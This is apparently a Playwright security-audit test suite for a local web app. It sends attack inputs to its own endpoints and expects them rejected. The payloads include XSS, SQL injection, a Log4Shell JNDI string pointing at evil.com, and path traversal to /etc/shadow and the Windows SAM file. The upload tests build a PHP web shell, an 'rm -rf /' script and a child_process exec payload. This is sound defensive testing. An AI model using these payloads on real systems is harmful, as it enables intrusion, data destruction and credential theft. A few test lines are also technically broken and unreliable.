import { test, expect, type Page, type APIRequestContext } from "@playwright/test"

// Security Auditing Tests
// These tests verify security measures and vulnerability protection

test.describe("Security Auditing", () => {
  let apiContext: APIRequestContext

  test.beforeEach(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({
      baseURL: "http://localhost:3000",
      extraHTTPHeaders: {
        'Content-Type': 'application/json'
      },
      ignoreHTTPSErrors: true // For testing various security scenarios
    })
  })

  test.afterEach(async () => {
    await apiContext.dispose()
  })

  test("dependency vulnerability scanning", async ({ page }) => {
    // Test for known vulnerable dependencies
    const vulnerablePackages = [
      'lodash', // Known vulnerabilities in older versions
      'axios',   // Known vulnerabilities in older versions
      'express', // Known vulnerabilities in older versions
      'moment',  // Known vulnerabilities in older versions
      'request'  // Deprecated with known vulnerabilities
    ]

    for (const pkg of vulnerablePackages) {
      // Check if vulnerable package is loaded
      const packageCheck = await page.evaluate((packageName) => {
        // This would check if the package is loaded in the application
        try {
          return require?.(packageName) !== undefined || 
                 window[packageName] !== undefined ||
                 document.querySelector(`script[src*="${packageName}"]`) !== null
        } catch {
          return false
        }
      }, pkg)

      // If package is loaded, it should be a safe version
      if (packageCheck) {
        const versionCheck = await page.evaluate((packageName) => {
          try {
            const pkg = require?.(packageName)
            return pkg?.version || 'unknown'
          } catch {
            return 'unknown'
          }
        }, pkg)

        // Log package version for security audit
        console.log(`Security audit: ${pkg} version ${versionCheck}`)
      }
    }

    // Test for outdated dependencies
    const outdatedCheck = await page.evaluate(() => {
      // This would integrate with npm audit or similar tools
      return {
        outdated: [],
        vulnerable: [],
        deprecated: []
      }
    })

    // Should not have critical vulnerabilities
    expect(outdatedCheck.vulnerable.length).toBe(0)
  })

  test("code security analysis", async ({ page }) => {
    // Test for common security vulnerabilities in frontend code
    const securityChecks = await page.evaluate(() => {
      const results = {
        evalUsage: false,
        innerHTMLUsage: false,
        documentWriteUsage: false,
        unsafeRegex: false,
        globalVariableLeaks: false,
        prototypePollution: false,
        xssVulnerabilities: false,
        csrfVulnerabilities: false
      }

      // Check for eval usage
      try {
        const evalCheck = document.body.innerHTML.includes('eval(') || 
                          document.body.innerHTML.includes('Function(')
        results.evalUsage = evalCheck
      } catch {}

      // Check for innerHTML usage
      try {
        const innerHTMLCheck = document.body.innerHTML.includes('innerHTML') ||
                             document.body.innerHTML.includes('outerHTML')
        results.innerHTMLUsage = innerHTMLCheck
      } catch {}

      // Check for document.write usage
      try {
        const documentWriteCheck = document.body.innerHTML.includes('document.write')
        results.documentWriteUsage = documentWriteCheck
      } catch {}

      // Check for unsafe regex
      try {
        const unsafeRegex = /[\\[\\{\\^\\$\\*\\+\\?\\.]/
        const unsafeRegexCheck = unsafeRegex.test(document.body.innerHTML)
        results.unsafeRegex = unsafeRegexCheck
      } catch {}

      return results
    })

    // Security vulnerabilities should be minimal
    expect(securityChecks.evalUsage).toBe(false)
    expect(securityChecks.documentWriteUsage).toBe(false)
    
    // innerHTML usage should be sanitized
    if (securityChecks.innerHTMLUsage) {
      const sanitizedCheck = await page.evaluate(() => {
        // Check if innerHTML usage is properly sanitized
        const innerHTMLMatches = document.body.innerHTML.match(/innerHTML[^=]*=[^;]*/g) || []
        return innerHTMLMatches.every(match => 
          match.includes('sanitize') || 
          match.includes('escape') ||
          match.includes('textContent')
        )
      })
      
      expect(sanitizedCheck).toBe(true)
    }
  })

  test("authentication security audit", async ({ page }) => {
    // Test authentication mechanisms
    const authTests = [
      {
        name: 'password-strength',
        test: async () => {
          const response = await apiContext.post('/api/auth/register', {
            data: {
              username: 'testuser',
              password: '123', // Weak password
              email: 'test@example.com'
            }
          })
          
          // Should reject weak passwords
          expect([400, 422]).toContain(response.status())
        }
      },
      {
        name: 'brute-force-protection',
        test: async () => {
          const responses = []
          
          // Simulate brute force attack
          for (let i = 0; i < 10; i++) {
            const response = await apiContext.post('/api/auth/login', {
              data: {
                username: 'admin',
                password: `wrong${i}`
              }
            })
            responses.push(response.status())
          }
          
          // Should eventually be rate limited
          const rateLimitedResponses = responses.filter(status => status === 429)
          expect(rateLimitedResponses.length).toBeGreaterThan(0)
        }
      },
      {
        name: 'session-security',
        test: async () => {
          // Test session fixation
          const loginResponse = await apiContext.post('/api/auth/login', {
            data: {
              username: 'test@example.com',
              password: 'test-password'
            }
          })

          if (loginResponse.status() === 200) {
            const authData = await loginResponse.json()
            
            // Session token should be secure
            expect(authData.token).toBeTruthy()
            expect(typeof authData.token).toBe('string')
            expect(authData.token.length).toBeGreaterThan(20) // Should be sufficiently long
          }
        }
      }
    ]

    for (const authTest of authTests) {
      await authTest.test()
    }
  })

  test("input validation security audit", async ({ page }) => {
    // Test comprehensive input validation
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src=x onerror=alert("xss")>',
      '"; DROP TABLE users; --',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}', // Template injection
      '<%7b%7d', // URL encoded template injection
      '../../../etc/passwd',
      'null',
      'undefined',
      'NaN',
      'Infinity',
      '-Infinity'
    ]

    const endpoints = [
      { method: 'POST', url: '/api/message', data: { content: '' } },
      { method: 'POST', url: '/api/search', data: { query: '' } },
      { method: 'POST', url: '/api/user/update', data: { name: '' } },
      { method: 'GET', url: '/api/data', query: 'param=' }
    ]

    for (const endpoint of endpoints) {
      for (const maliciousInput of maliciousInputs) {
        let response
        
        if (endpoint.method === 'POST') {
          const data = { ...endpoint.data }
          const key = Object.keys(data)[0]
          data[key] = maliciousInput
          
          response = await apiContext.post(endpoint.url, { data })
        } else {
          response = await apiContext.get(endpoint.url + maliciousInput)
        }

        // Should reject or sanitize malicious input
        expect([400, 422, 403]).toContain(response.status())
      }
    }
  })

  test("file security audit", async ({ page }) => {
    // Test file upload security
    const maliciousFiles = [
      { name: 'malware.exe', content: Buffer.from('fake malware'), type: 'application/octet-stream' },
      { name: 'script.php', content: Buffer.from('<?php system($_GET["cmd"]); ?>'), type: 'application/x-php' },
      { name: 'virus.scr', content: Buffer.from('fake virus'), type: 'application/octet-stream' },
      { name: 'shell.sh', content: Buffer.from('#!/bin/bash\nrm -rf /'), type: 'application/x-sh' },
      { name: 'exploit.js', content: Buffer.from('eval(require("child_process").execSync("id"))'), type: 'application/javascript' }
    ]

    for (const file of maliciousFiles) {
      const formData = new FormData()
      formData.append('file', new Blob([file.content]), file.name)

      const response = await apiContext.post('/api/upload', {
        data: formData
      })

      // Should reject malicious files
      expect(response.status()).toBeGreaterThanOrEqual(400)

      if (response.status() >= 400) {
        const errorData = await response.json()
        expect(errorData.error).toBeTruthy()
      }
    }

    // Test file path traversal
    const pathTraversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      '....//....//....//etc/passwd'
    ]

    for (const path of pathTraversalAttempts) {
      const response = await apiContext.get(`/api/file/${encodeURIComponent(path)}`)
      
      // Should reject path traversal
      expect(response.status()).toBeGreaterThanOrEqual(400)
    }
  })

  test("network security audit", async ({ page }) => {
    // Test network security measures
    const networkTests = [
      {
        name: 'https-only',
        test: async () => {
          // Test HTTP requests (should be rejected or redirected)
          const httpContext = await page.request.newContext({
            baseURL: "http://localhost:3000"
          })
          
          const response = await httpContext.get('/api/health')
          
          // Should prefer HTTPS or redirect
          expect([301, 302, 403]).toContain(response.status())
          
          await httpContext.dispose()
        }
      },
      {
        name: 'certificate-validation',
        test: async () => {
          // Test with invalid certificates
          const invalidCertContext = await page.request.newContext({
            baseURL: "https://localhost:3000",
            ignoreHTTPSErrors: true
          })
          
          const response = await invalidCertContext.get('/api/health')
          
          // Should handle certificate issues gracefully
          expect(response.status()).toBeLessThan(500)
          
          await invalidCertContext.dispose()
        }
      },
      {
        name: 'cors-security',
        test: async () => {
          // Test CORS with malicious origin
          const response = await apiContext.fetch('/api/test', {
            method: 'OPTIONS',
            headers: {
              'Origin': 'http://evil-site.com',
              'Access-Control-Request-Method': 'POST'
            }
          })
          
          // Should reject malicious origins
          expect(response.status()).toBeGreaterThanOrEqual(400)
        }
      }
    ]

    for (const test of networkTests) {
      await test.test()
    }
  })

  test("data protection audit", async ({ page }) => {
    // Test data protection measures
    const dataProtectionTests = [
      {
        name: 'sensitive-data-exposure',
        test: async () => {
          const responses = [
            await apiContext.get('/api/user/profile'),
            await apiContext.get('/api/error'),
            await apiContext.post('/api/auth/login', {
              data: { username: 'invalid', password: 'invalid' }
            })
          ]

          for (const response of responses) {
            const data = await response.json()
            const dataString = JSON.stringify(data)
            
            // Should not expose sensitive data
            expect(dataString).not.toContain('password')
            expect(dataString).not.toContain('secret')
            expect(dataString).not.toContain('token')
            expect(dataString).not.toContain('key')
            expect(dataString).not.toContain('database')
            expect(dataString).not.toContain('stack trace')
          }
        }
      },
      {
        name: 'data-encryption',
        test: async () => {
          // Test if sensitive data is encrypted
          const sensitiveDataResponse = await apiContext.get('/api/sensitive-data')
          
          if (sensitiveDataResponse.status() === 200) {
            const data = await sensitiveDataResponse.json()
            
            // Sensitive fields should be encrypted or masked
            Object.keys(data).forEach(key => {
              if (key.includes('password') || key.includes('secret') || key.includes('token')) {
                expect(data[key]).toMatch(/^\*+$/) || expect(data[key]).toMatch(/^[A-Za-z0-9+/=]+$/) // Encrypted
              }
            })
          }
        }
      },
      {
        name: 'data-retention',
        test: async () => {
          // Test data retention policies
          const oldDataResponse = await apiContext.get('/api/old-data')
          
          if (oldDataResponse.status() === 200) {
            const data = await oldDataResponse.json()
            
            // Should not return very old data
            if (Array.isArray(data) && data.length > 0) {
              const oldestData = data[0]
              if (oldestData.created_at) {
                const createdDate = new Date(oldestData.created_at)
                const now = new Date()
                const daysDiff = (now.getTime() - createdDate.getTime()) / (1000 * 60 * 60 * 24)
                
                // Should not have data older than 1 year (adjust as needed)
                expect(daysDiff).toBeLessThan(365)
              }
            }
          }
        }
      }
    ]

    for (const test of dataProtectionTests) {
      await test.test()
    }
  })

  test("logging and monitoring audit", async ({ page }) => {
    // Test security logging and monitoring
    const loggingTests = [
      {
        name: 'security-event-logging',
        test: async () => {
          // Trigger security events
          const securityEvents = [
            apiContext.post('/api/auth/login', {
              data: { username: 'admin', password: 'wrong' }
            }),
            apiContext.get('/api/admin'),
            apiContext.post('/api/data', {
              data: { content: '<script>alert("xss")</script>' }
            })
          ]

          for (const event of securityEvents) {
            await event
          }

          // Check if events are logged
          const logsResponse = await apiContext.get('/api/audit/logs')
          
          if (logsResponse.status() === 200) {
            const logs = await logsResponse.json()
            
            // Should have security event logs
            expect(Array.isArray(logs)).toBe(true)
            
            if (logs.length > 0) {
              const recentLogs = logs.filter((log: any) => {
                const logTime = new Date(log.timestamp)
                const now = new Date()
                return (now.getTime() - logTime.getTime()) < 60000 // Last minute
              })
              
              expect(recentLogs.length).toBeGreaterThan(0)
            }
          }
        }
      },
      {
        name: 'intrusion-detection',
        test: async () => {
          // Simulate intrusion attempts
          const intrusionAttempts = [
            apiContext.post('/api/auth/login', {
              data: { username: 'admin', password: 'admin' }
            }),
            apiContext.get('/api/admin/users'),
            apiContext.post('/api/upload', {
              data: { file: 'malware.exe' }
            })
          ]

          for (const attempt of intrusionAttempts) {
            await attempt
          }

          // Check for intrusion detection
          const securityResponse = await apiContext.get('/api/security/status')
          
          if (securityResponse.status() === 200) {
            const securityStatus = await securityResponse.json()
            
            // Should detect suspicious activity
            expect(securityStatus.suspiciousActivity).toBe(true)
            expect(securityStatus.alerts.length).toBeGreaterThan(0)
          }
        }
      }
    ]

    for (const test of loggingTests) {
      await test.test()
    }
  })

  test("compliance audit", async ({ page }) => {
    // Test compliance with security standards
    const complianceTests = [
      {
        name: 'gdpr-compliance',
        test: async () => {
          // Test GDPR compliance
          const gdprTests = [
            apiContext.get('/api/user/data'), // Right to access
            apiContext.delete('/api/user/data'), // Right to be forgotten
            apiContext.post('/api/consent/update', {
              data: { consent: false }
            }) // Consent management
          ]

          for (const test of gdprTests) {
            const response = await test
            
            // Should handle GDPR requests
            expect(response.status()).toBeLessThan(500)
          }
        }
      },
      {
        name: 'accessibility-compliance',
        test: async () => {
          // Test accessibility compliance
          const accessibilityCheck = await page.evaluate(() => {
            const axeResults = {
              violations: [],
              passes: []
            }
            
            // Basic accessibility checks
            const images = document.querySelectorAll('img')
            images.forEach(img => {
              if (!img.alt && img.role !== 'presentation') {
                axeResults.violations.push('Missing alt text')
              }
            })
            
            const buttons = document.querySelectorAll('button')
            buttons.forEach(button => {
              if (!button.textContent?.trim() && !button.getAttribute('aria-label')) {
                axeResults.violations.push('Button missing accessible name')
              }
            })
            
            return axeResults
          })

          // Should have minimal accessibility violations
          expect(accessibilityCheck.violations.length).toBeLessThan(5)
        }
      }
    ]

    for (const test of complianceTests) {
      await test.test()
    }
  })

  test("penetration testing simulation", async ({ page }) => {
    // Simulate common penetration testing scenarios
    const penTestScenarios = [
      {
        name: 'sql-injection',
        test: async () => {
          const sqlPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
            "' OR 1=1--"
          ]

          for (const payload of sqlPayloads) {
            const response = await apiContext.post('/api/search', {
              data: { query: payload }
            })
            
            // Should reject SQL injection attempts
            expect(response.status()).toBeGreaterThanOrEqual(400)
          }
        }
      },
      {
        name: 'xss-attack',
        test: async () => {
          const xssPayloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>"
          ]

          for (const payload of xssPayloads) {
            const response = await apiContext.post('/api/message', {
              data: { content: payload }
            })
            
            // Should reject or sanitize XSS attempts
            expect([400, 422]).toContain(response.status())
          }
        }
      },
      {
        name: 'csrf-attack',
        test: async () => {
          // Simulate CSRF attack
          const csrfResponse = await apiContext.post('/api/user/update', {
            data: { name: 'hacked' },
            headers: {
              'Referer': 'http://evil-site.com'
            }
          })
          
          // Should reject CSRF attempts
          expect([400, 403, 419]).toContain(csrfResponse.status())
        }
      }
    ]

    for (const scenario of penTestScenarios) {
      await scenario.test()
    }
  })

  test("security configuration audit", async ({ page }) => {
    // Test security configuration
    const configTests = [
      {
        name: 'security-headers',
        test: async () => {
          const response = await apiContext.get('/api/health')
          const headers = response.headers()
          
          // Should have security headers
          const requiredHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
            'strict-transport-security',
            'content-security-policy'
          ]

          for (const header of requiredHeaders) {
            expect(headers[header]).toBeTruthy()
          }
        }
      },
      {
        name: 'cookie-security',
        test: async () => {
          const response = await apiContext.post('/api/auth/login', {
            data: { username: 'test', password: 'test' }
          })

          if (response.status() === 200) {
            const cookies = response.headers()['set-cookie']
            
            if (cookies) {
              // Cookies should be secure
              expect(cookies).toContain('Secure')
              expect(cookies).toContain('HttpOnly')
              expect(cookies).toContain('SameSite')
            }
          }
        }
      },
      {
        name: 'error-handling',
        test: async () => {
          const errorResponse = await apiContext.get('/api/nonexistent')
          
          // Should handle errors gracefully
          expect(errorResponse.status()).toBe(404)
          
          const errorData = await errorResponse.json()
          expect(errorData.message).toBeTruthy()
          expect(errorData.stack).toBeUndefined() // No stack traces in production
        }
      }
    ]

    for (const test of configTests) {
      await test.test()
    }
  })
})
